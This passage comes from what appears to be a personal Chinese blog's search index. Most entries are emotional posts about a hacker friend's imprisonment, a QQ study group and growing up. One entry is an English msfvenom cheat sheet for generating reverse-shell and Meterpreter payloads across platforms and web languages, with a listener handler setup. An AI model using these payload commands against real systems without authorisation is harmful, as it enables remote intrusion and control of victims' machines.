Y吗。没错哦，现在他也考上了自己心仪的大学满意的专业。我和小Y认识的真的很早，他真的是我在认识你之前，我认为最努力和最勇于去追梦的小伙子。虽然我在认识你之后还是觉得他最有潜力，哈哈哈。和你一样，爱钻研不放弃也是他的标签，不过，仔细想想，我们大风车里的哪一个人又不是这样呢。“总有一天我们为之奋斗和努力的目标，会反过来拥抱我们。”这是我们这一波人始终坚信的真理。当然了，我们的小Y也有许多想对你说的：</p><p>[To our Bge：不知不觉，你也已经消失联系好几个月了！不知道何时能见到你那头像闪烁在我的列表中 ！哎！</p><p>Bge，我和你虽然不太熟，但也算是一起玩过的朋友。大家都相识在我们曾经的“大风车”中！那个时候的你，与我们扯淡，与我们共同进步，与我们一起有说有笑 ！但现在都已经是过去时了！我不得不感叹物是人非啊！</p><p>遇到狗蛋是你这个人生中，可谓最大的转折点。把你捧到了你的巅峰，然而却不知道交友不慎的后果居然有如此之大！想起你的牢狱之灾我就不断叹息，真的第一次知道时心里一震，就像缺了什么似得，很不安生。</p><p>【属于你的回报】</p><p>遇到狗蛋后，据我了解，你们关系真的很不错。就是因为你的你热于助人，而狗蛋呢，他来者不拒（先不谈论关于狗蛋）所以自然而然玩得不错。你为他做了很多事情，你们一起日高权的站。随着你的技术与名声越来越大，圈子里的人了知道“狗蛋”还有你这个朋友“NPLT”，这是外人对你的尊称。在接下来的这年，你为他论坛录制视频，操心不少。在补天的团队获奖被邀去京，你当之无愧的作为代表人去了。你知道当时我们有多么的羡慕你能站上那个舞台，见识这么大场面，可以说现在我的目标之一，还是可以获此殊荣 。</p><p>我依然记得那天的颁奖直播，我看到了羞涩的Bge， 紧张的在颁奖现场，我们一群人看着直播，夸着这么帅气的你，看着这么高大的你。哎！肯定这段日子也是你最开心的时候了，但是接下来……</p><p>【谁也想不到的遭遇】</p><p>终于到了最悲伤的阶段。你与他的关系与日俱增，越来越好。却不知道为他扛得锅越来越多 ，可是你却没有看清楚他在利用你们（此处省略甲乙丙）扩大自己的名气。</p><p>但是我失策了，我真的失策了！我知道他干的勾当，我也知道他有后台。但是我不知道，在你，这个与他玩了日日夜夜的，我们的Bge出事的时候，他没有选择保你。他为了自己的利益，完全没有考虑过你，甚至现在依然逍遥，没有半点悔意。我到现在都没有看到他发过任何感慨，就像无所谓似得 ？ WTF “你还我们的Bge！”</p><p>事已至此，说什么也没用了。你遭遇此难，也算是不公平的老天给你的试炼，但是我们依然痛心。</p><p>其他没什么，我相信你一定能挺过来，我们会等着你回来的 ！</p><p>——————-致我们的永远的Bge ]</p><p>不知道Bge你看到这里，面对大伙的真情流露是否已经内牛满面，至少也应该明白了自己不寂寞了吧。当然了，我们的大风车里还有一个不会尬舞的“魔法天女”—队长！现在我也忘记了，队长这个名字是从何而来的了，但是这个来自中国传媒大学的少女总是能给我们的平静的生活带来一点刺激和多彩。我不管她现在是那个穿着破裤子还让外婆缝的大姑娘，还是开着狂拽酷炫屌炸天摩托车的狂野女郎。“队长”这两个字，和你Bge一样，都和我们大风车牢牢地挂勾在了一起。替你抱不平的是她，替你呐喊的也总是她。你空间还保留着和她的那张酷酷的合照，也是她每次想你时候可以看看的地方。或许“队长”坚韧的心让她不会替你哭泣，但是她却有无数的话想对你诉说：（由于队长暂时出去玩了，没把想说的发给我，二改必然补上，尽请期待！）</p><p>最后想对你两句的当然还有我们的老大了，毕竟boss总是压轴出场的。回想起每次我和老大出去吃饭，谈论到你，剩下的也只有惋惜。现在老大工作忙了加上有了家庭，也没有太多的时间和我们在“大风车”里愉快的玩耍了，但是他还是总出现在我们最需要帮助的时候。当我们遇到瓶颈的时候，他的一两句指点，往往就能让我们遇到问题迎刃而解。老大话不多，但是句句精辟，他想对你说的就一句话：“唉！成天骂人傻逼最后自己当了傻逼。”或许，这句话看似好笑，但是却包含了老大对你的惋惜和意味深长。人生如棋，一步走错了，满盘皆输？我看未必，命运始终是把握在自己的手上，即使是失去一切也不意味着缺憾，何况你还没有失去一切，你至少还剩下等待你回来的亲人和我们这一群朋友，难道不是吗？</p><p>大风车里还有一些小伙伴有很多话想对你说的，但是由于工作的忙碌，无法表达。我也替他们将千言万语汇成一句话：Bge，大风车永远是你的家，等你回来！</p>]]></content>
    
    
    <categories>
      
      <category>胡思乱想</category>
      
    </categories>
    
    
    <tags>
      
      <tag>生活</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>msf的各种生成payload命令</title>
    <link href="/p/d6e1a656.html"/>
    <url>/p/d6e1a656.html</url>
    
    <content type="html"><![CDATA[<p>Often one of the most useful (and to the beginner underrated) abilities of Metasploit is the msfpayload module. Multiple payloads can be created with this module and it helps something that can give you a shell in almost any situation. For each of these payloads you can go into msfconsole and select exploit/multi/handler. Run ‘set payload’ for the relevant payload used and configure all necessary options (LHOST, LPORT, etc). Execute and wait for the payload to be run. For the examples below it’s pretty self explanatory but LHOST should be filled in with your IP address (LAN IP if attacking within the network, WAN IP if attacking across the internet), and LPORT should be the port you wish to be connected back on.</p><a id="more"></a><p>List payloads</p><p>msfvenom -l</p><h2 id="Os-Payloads"><a href="#Os-Payloads" class="headerlink" title="Os Payloads:"></a>Os Payloads:</h2><p><strong>Linux</strong></p><p><code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</code></p><p><strong>Windows</strong></p><p><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe</code></p><p><strong>Mac</strong></p><p><code>msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f macho &gt; shell.macho</code></p><h2 id="Web-Payloads："><a href="#Web-Payloads：" class="headerlink" title="Web Payloads："></a>Web Payloads：</h2><p><strong>PHP</strong></p><p><code>  msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.php cat shell.php | pbcopy &amp;&amp; echo &#39;&lt;?php &#39; | tr -d &#39;\n&#39; &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</code></p><p><strong>ASP</strong></p><p><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.asp</code></p><p><strong>JSP</strong></p><p><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jsp</code></p><p><strong>WAR</strong></p><p><code>  msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f war &gt; shell.war</code></p><h2 id="Scripting-Payloads"><a href="#Scripting-Payloads" class="headerlink" title="Scripting Payloads:"></a>Scripting Payloads:</h2><p><strong>Python</strong></p><p><code>msfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.py</code></p><p><strong>Bash</strong></p><p><code>msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.sh</code></p><p><strong>Perl</strong></p><p><code>msfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl</code></p><h2 id="Shellcode"><a href="#Shellcode" class="headerlink" title="Shellcode:"></a>Shellcode:</h2><p>For all shellcode see ‘msfvenom –help-formats’ for information as to valid parameters. Msfvenom will output code that is able to be cut and pasted in this language for your exploits.</p><p><strong>Linux Based Shellcode</strong></p><p><code>  msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</code></p><p><strong>Windows Based Shellcode</strong></p><p><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</code></p><p><strong>Mac Based Shellcode</strong></p><p><code>msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</code></p><h2 id="Handlers："><a href="#Handlers：" class="headerlink" title="Handlers："></a>Handlers：</h2><p>Metasploit handlers can be great at quickly setting up Metasploit to be in a position to receive your incoming shells. Handlers should be in the following format.</p><p><code>  use exploit/multi/handler set PAYLOAD &lt;Payload name&gt; set LHOST &lt;LHOST value&gt; set LPORT &lt;LPORT value&gt; set ExitOnSession false exploit -j -z</code></p><p>Once the required values are completed the following command will execute your handler – ‘msfconsole -L -r ‘</p>]]></content>
    
    
    <categories>
      
      <category>学习文章</category>
      
    </categories>
    
    
    <tags>
      
      <tag>msf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>我想说的话，我的大风车</title>
    <link href="/p/cef53610.html"/>
    <url>/p/cef53610.html</url>
    
    <content type="html"><![CDATA[<p>原文:<br>我今年23岁，毕业两年，做过运维，做过安全，做过手机，也做过黑产。<br>会web渗透，会脚本语言，会Windows/Linux底层安全运维，会安卓框架<br>爱跑步，爱极限运动，爱计算机，爱网络。</p><p>21岁，刚刚出来工作，之前做黑产积累了一点资本，一通公安的电话，我成了什么都没有的应届找工作的大学生。</p><a id="more"></a><p>我去过智联招聘当服务器运维技术员，去过智联安防做过网络安全总监，最后在机锋网当了一名第三方rom框架组组长。我跑过手机发布会，待过线下座谈会，也低着头去大公司帮忙做安全，和两年前相似，我又有了一点在这个社会上活下来的需要的最重要的东西。</p><p>今年5月，我父亲退休了，我和我女朋友准备结婚了，6月3号，我们领证了。7月11日，我们办了订婚宴，10月28号，我们本该结婚了，家里出事了。两年累计下来的资本，又化为泡影。这次，现在不是什么都没有，是我欠了别人许多许多。</p><p>她说，没有关系，什么时候办婚宴都可以，先把事情解决了。<br>我向机锋预支了4个月工资加所有奖金，经理同意了。他说，360你去不了了，除非你能把这4个月该做的，在1月份前完成，现在，快了。<br>进入社会，快3年了，可能这些跟真正大起大落的人比不算什么，可是我真的累。</p><p>穷途末路，没有地方借钱，我试着在网络上找那些朋友帮忙，可是，他们不认识我了，一个都不认识了。我无心组建的一个QQ群，他叫大风车，随意打的名字。里面除了学生，还是学生，根本就没有见过面的人。可是他们却帮我了，虽然还不足凤毛麟角，可是他们确实帮了我。现在稍微缓和了一点，可是事还没有解决，不过他们已经帮了我最多最多了。<br>今晚的事还没有做完，很累，只能不停的点烟提神，突然看到那个图标，想起那天夕阳下的奔跑。我想说点话，也想找个地方把我的累说出来，还想对大风车的人说点话，虽然有二十来个人，可是，我却只记得这几个。</p><p>小Y：<br>&emsp;&emsp;其实你刚刚进来的时候，我记得是一个钻阔，是不是你我还真想不起来了，那时候大风车人也多，大家不停的嘲讽，可是你却没有发飙，只是不停的说那是以前不懂，现在要学习技术。现在大风车那么团结了，我也看到你的成长，你的好学，你的努力，也在我困难的时候给了大风车这个集体给予我最大的帮助，真要送你一个祝福，我希望你考上自己喜欢的大学，喜欢的专业。再找一个女朋友，哪天你可以和我说，老大，我找到女朋友了。</p><p>大师智：<br>&emsp;&emsp;什么时候开始这么叫你的，具体哪天想不起来了，只记得我很喜欢一个游戏解说叫小智，他那天上了大师在直播，于是你说你自己是大师智，就一直这样叫着了。我时常黑你，怎么黑好玩就怎么来，你也别生气，尊敬是留给陌生人的，好朋友才互相黑着玩的你说对吧。你太懒了，找点时间给自己补点墨水，虽然大风车是一个朋友的集体，可我的初衷是培养一些人。</p><p>碧哥：<br>&emsp;&emsp;同样也是叫大师智开始，这么叫你的。你很逗比，我很喜欢这样乐观的人，我完全看不到你的成长，我感觉你遇到95后突然一下子变成一个人人喊大牛的碧哥，可是你几斤几两现在好像能摸的清楚，别膨胀，你总有真正是大牛的一天，还有，快找个女朋友，天天用大师智送的娃娃，容易漏气。</p><p>表哥：<br>&emsp;&emsp;是不是现在都流行叫哥了啊，碧哥就算了还有个表哥。希望你做你想做的，以后如果公司缺运维，我第一个推荐你，问题尽管向我问，我真看不见，你抖我一下都成。<br>表姐：<br>&emsp;&emsp;刚刚说要表哥就说表姐了，也许你现在在题海，看不见，我也希望你和小Y一样，考上自己想去的大学。</p><p>土豆：<br>&emsp;&emsp;你是大风车的老人了，我对你的印象是沉默寡言的人，一个问题爱一直研究的人，或许你不是，只是不经常出现了，记忆中你是工作了吧，忙了就很难顾及到别的了，一起为了生活拼搏吧！</p><p>jame_xhs：<br>&emsp;&emsp;妈的你这名字也太长了，就不能有一个朗朗上口的称呼吗。我们有共同的爱好，我们都喜欢手机，喜欢他的外观工艺，喜欢他的软件系统，能找到一个同爱好的人，本来就是人生中一件难得的事，多冒泡，大风车是一个大家庭，每个人的关系都应该一样，每一个话题大家都应该能一起说。加油！</p><p>95：<br>&emsp;&emsp;和你认识的时间不长，不过也谢谢你信得过我，也谢谢你帮过我，我们目前的状态一样，你为梦想拼，我为生活拼，都是拼搏。一月份，我给你一个sss团队核心该有的样子，给你一个sss团队讲师该有的进度，共勉！</p><p>疯子：<br>&emsp;&emsp;我对你没有什么印象，不过在我困难的时候QQ私聊我需要帮助吗，现在还是很感激你的，真的，我对你没有什么印象，只知道你是大风车群里的一员，也知道你喜欢健身，我一直希望大风车是一个大家都是好朋友的地方，虽然只是网络，可能虚无缥缈，可是朋友缺不是虚无缥缈的东西。</p><p>小可爱：<br>&emsp;&emsp;我一直觉得你是一个很有想法的人，总感觉你和同龄人不一样，也很努力，我一直觉得当初我学习技术的时候已经很努力了，可是我做不到晚上12点睡第二天7点就可以起来看php，不管是不是一时而起的干劲，他都是你努力的象征，同样的，我也希望你的生活好一点，至少比我好，不是一点，是很多。</p><p>iceH：<br>&emsp;&emsp;我告诉你，你这个名字太low了。我不记得怎么加的你，还是你加的我，只记得你混迹在许多的娱乐圈里面，动不动就什么黑客精神的娱乐圈，还爱邀请我，那时候真的烦。不过你现在好像有一点转变，有没有混迹我不知道，至少没有对我进行邀群DDOS了，你需要改变的是技术，技术好了，你邀请我进黄色直播群我都不在意。</p><p>虫二：<br>&emsp;&emsp;感谢你在努力适应大风车，每一个后来进入大风车的人都希望能学好技术，不过可能让你失望了，还真没学到，我忙到没有时间教你们，偶尔有时间还尽和大家扯蛋，别怪我，进了大风车就是好朋友，好朋友的知识总会分享给你的。</p><p>小队长：<br>&emsp;&emsp;别生气你是最后一个，主角都是最后出场的，也别问大姐呢？这是我写给大风车的人，大姐是我穿一条内裤长大的兄弟，有什么心里话，我会直接对他说。你是集体里面唯一的女孩，也是我最疼的妹妹，我可以黑任何人，就是不会黑你，任何人也不可以黑你，大师智敢欺负你，我第一个剁他的猪屌，我希望你开开心心的，活好每一天，你有什么要求，我能做到的，尽量做，晚上早点睡，女孩的皮肤和身体很重要的，我很爱听你和我倾诉你的生活，也谢谢你可以听我生活的辛苦。你一直是最漂亮可爱的，谁说不是，和大师智一样，把他挂树上剁屌。大风车一开始是一个技术的集合，可是却意外成为一个大家庭，可是我不忘初衷，一直希望你们学好技术，你不同，你的任务就是卖萌打扮，做自己开心想做的事，哪天找到你爱的人，爱你的人，别把我这个老大忘记了。</p><p>这一直是我想对你们说的心里话，可能有点心灵鸡汤了，好像这不是那个天天爱开玩笑没事讲几个黄段子的我了，不过我还是觉得，网络不是友谊的鸿沟，是好朋友就是好朋友，哪来那么多别的事，见不见过又怎样，是否了解又怎样，至少我们聊起天来很开心。差不多了，点根烟，继续把没做完的事做完。</p><p>  谢谢你们听我说心里话，谢谢你们能了解我，谢谢你们叫我老大。</p><p>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;——永远旋转的大风车</p>]]></content>
    
    
    <categories>
      
      <category>胡思乱想</category>
      
    </categories>
    
    
    <tags>
      
      <tag>生活</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>我们都长大了</title>
    <link href="/p/c0685e8f.html"/>
    <url>/p/c0685e8f.html</url>
    
    <content type="html"><![CDATA[<p>我们都成了大人，不是原来打打闹闹了，不管做什么，都牵扯到钱，牵扯到自己身边的人安全与否。狐朋狗友多了，真正的兄弟少了，以前的同学也不联系了，会打架，会和父母吵架，在家里也不经常和家里人说话了，不再像小时候腻着爸妈，和父母的关系越来越差，晚上睡觉的时候，想到之前父母那严厉的面容，枕头上总会湿一片。</p><p>我们都成了大人，都有了自己的梦想，有了自己的理想，原本无趣的生活有了一丝乐趣。为了自己的理想在拼搏，在努力，在学习。可能父母的不理解，总是阻碍我们。这不怪他们，他们只是为了我们好。</p><a id="more"></a><p>我们都成了大人，开始越来越愁眉苦脸，每天维持着烦恼。为了理想努力而遇到瓶颈，生活的劳累奔波，甚至头发的长度，鞋子的颜色都成了我们所要烦恼的事情。压力大了，身边的人不再问你考了多少分，而是问成就怎么样，快毕业了准备去哪里就业，哪所重点高中的，哪所名牌大学的，哪所大公司的。</p><p>我们都成了大人，开始各种故事一连串的出现在我们生活中，有好的，有坏的。有爱我的人，有伤害过我的人，被这个鸡巴社会弄的现实的我们，都已经是大人了。成长的路总是有挫折，而我们的这个年龄，似乎已经被各种困难，各种挫折弄的麻木了。小时候的同情心似乎越来越不见了，见到街上的什么破产大学生，断了条胳膊就出来乞讨的人，不会像小时候那么同情他们，甚至翻出口袋仅有的几块零花钱毫不心疼的扔进他们的碗里、包里。现在的我们，总会想很多。管我屁事？自己的搞不定自己还去管别人？破产？你有胳膊右腿有脑袋你不会去找事情做？至少养活自己，放下尊严来乞讨？你他妈还是个人？断条胳膊就不能干事了？收破烂都比这个强。成了大人的我们，发现自己想的更多了，是福是祸？</p><p>我们都成了大人，我们知道了，在生活面前，一切挫折和困难都不残酷，看重的是过程而不是结局，只要活着，有着尊严，那些都不算什么。我们都感谢那些伤害过，爱过我们的人，我们会感谢那首让我们振作、感动流涕的歌。</p><p>一眨眼，时间不等人，我们都成了那小时候崇拜，期盼，那所谓的大人。</p>]]></content>
    
    
    <categories>
      
      <category>胡思乱想</category>
      
    </categories>
    
    
    <tags>
      
      <tag>生活</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
